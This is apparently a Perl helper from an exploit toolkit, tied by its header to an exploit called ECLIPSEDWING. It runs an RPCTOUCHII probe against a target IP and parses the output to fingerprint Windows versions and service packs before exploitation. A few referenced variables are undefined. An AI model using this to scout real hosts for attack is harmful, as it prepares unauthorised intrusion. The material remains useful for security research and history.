#    WARNING: ECLIPSEDWING DOES NOT IMPLEMENT AN EXPLOIT SPECIFIC TOUCH
#             IT RELIES COMPLETELY ON RPCTOUCH2!!! 
#   $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
##############################################################################






##############################################################################
#
#			L A U N C H _ R P C T O U C H I I
#
# Parameters:
#	$_[0] = Root Directory
#	$_[1] = Target IP
#	$_[2] = Target Port
#	$_[3] = Run Option
#	$_[4] = Target Transport Protocol
#	$_[5] = Target Application Protocol
#	$_[6] = Target HTTP Server Ip (for use with RPC Protocol Sequence rpc_http only)
#	$_[7] = Time Out Value
#
#
#
#			RPCTOUCHII Probe types
#
# $RPCTOUCHII_RUN_GENERAL_PROBE				= 1;
# $RPCTOUCHII_RUN_REGPROBE					= 2;
# $RPCTOUCHII_RUN_XP_SP0_PROBE	            = 3; 
# $RPCTOUCHII_RUN_RPC_INTERFACE_PORT		= 4;
# $RPCTOUCHII_RUN_WINDOWS_2000_SP4_PROBE	= 5;
# $RPCTOUCHII_RUN_KB823980_PROBE			= 6; 
# $RPCTOUCHII_RUN_KB824146_PROBE			= 7; 
# $RPCTOUCHII_RUN_WINDOWS_2003_PROBE		= 8; 
#
#			OS versions
#
#	$not		= "NOT GOOD";
#	$w9x		= "Windows 9x";
#	$nt4		= "Windows NT 4.0";
#	$w2k		= "Windows 2000";
#	$w2ksp0123	= "Windows 2000 Service Pack 0, 1, 2, or 3";
#	$w2ksp4		= "Windows 2000 Service Pack 4";
#	$wxp		= "Windows XP";
#	$wxpsp0		= "Windows XP Service Pack 0";
#	$wxpsp1		= "Windows XP Service Pack 1";
#	$wxpsp2		= "Windows XP Service Pack 2";
#	$w2kXp		= "Windows 2000 XP" ;
#	$wxp2003	= "Windows XP Server 2003" ;
#	$ws2003		= "Windows Server 2003";
#	$ws2003sp1	= "Windows Server 2003 Service Pack 1";
#
# Returns:
#	Error code: 0 == No Error; 1 == Error.
#
# Globals:
#	$ExploitUtils::EU_LOG
#	$ExploitUtils::EU_EXITMESSAGE
#
# Program assumes that appropriate values for each of the specified input
# parameters were already validated.
#

sub launch_rpctouchii() {
	my ($root_dir, $TargetIp, $TargetPort, $RunOption, $TargetTransportProtocol, $TargetApplicationProtocol, $TargetServerIp, $TimeOutValue,$WindowsVersion) = @_;
	my $handle = new FileHandle;


	#my $AtsvcPort	= "Unknown";
	my $ProbeError = 0;			# Return Value:  0 == No Error; 1 == Error
	#my $MachineType = $not;		# Return Value: $unpatched or $patched or $not or $w9x or $nt4 or $w2k or $wxp or $ws20003;


	# call RPCII()
	my $cmdline = "\"$root_dir\\$::RPCTOUCHII\" -i $TargetIp -p $TargetPort -r $RunOption -t $TargetTransportProtocol -b $TargetApplicationProtocol -h $TargetServerIp -o $TimeOutValue";
	&EU_Log(0, "$cmdline");

	&EU_Log(0, "Probing target...");
	if(!open($handle, "$cmdline|")) {
		&EU_ExitMessage(1, "Unable to execute $::REGPROBE");
	}

	my $junk;
	my $line;
	my $success = 0;

	if( $RunOption eq $RPCTOUCHII_RUN_GENERAL_PROBE ) {		# Parse Rpctouch() response to Probe Type RPCTOUCHII_RUN_GENERAL_PROBE

		while(<$handle>) {
			chomp($line = $_);
			&EU_Log(1, $line);

			if($line =~ /ERROR/) 
			{
				$ProbeError = 1;
				#$MachineType = $not;
				$WindowsVersion = $::TARGET_VER_UNKNOWN;
			}
			elsif($line =~ /Looks like UNKNOWN Windows version/) 
			{
				#$MachineType = $not;
				$WindowsVersion = $::TARGET_VER_UNKNOWN;
			}
			elsif($line =~ /Looks like Windows XP Service Pack 2/) 
			{
				#$MachineType = $wxp;
				$WindowsVersion = $wxpsp2;
			}
			elsif($line =~ /Looks like Windows XP Service Pack 3/) 
			{
				#$MachineType = $wxp;
				$WindowsVersion = $wxpsp3;
			}
            elsif($line =~ /Looks like Windows 2003 Service Pack 0/) 
			{
				#$MachineType = $ws2003;
				$WindowsVersion = $ws2003sp0;
			}
            elsif($line =~ /Looks like Windows 2003 Service Pack 1/) 
			{
				#$MachineType = $ws2003;
				$WindowsVersion = $ws2003sp1;
			}
			elsif($line =~ /Looks like Windows 2003 Service Pack 2/) 
			{
				#$MachineType = $ws2003;
				$WindowsVersion = $ws2003sp2;
			}
			elsif($line =~ /Looks like Windows 2000/) 
			{
				$WindowsVersion = $w2ksp4;
			}
            elsif($line =~ /RPCTOUCHII 1.0.2/)
            {
                $ProbeError = 1;
                &EU_ExitMessage(1, "RPCTOUCH2 1.0.2 Detected. This exploit REQUIRED rpctouch2 v.1.0.4!!! Bailing...");
            }
            elsif($line =~ /RPCTOUCHII 1.0.3/)
            {
                $ProbeError = 1;
                &EU_ExitMessage(1, "RPCTOUCH2 1.0.3 Detected. This exploit REQUIRED rpctouch2 v.1.0.4!!! Bailing...");
            }
    	} #while
	} #if

	return($WindowsVersion, $ProbeError);
}


__END__



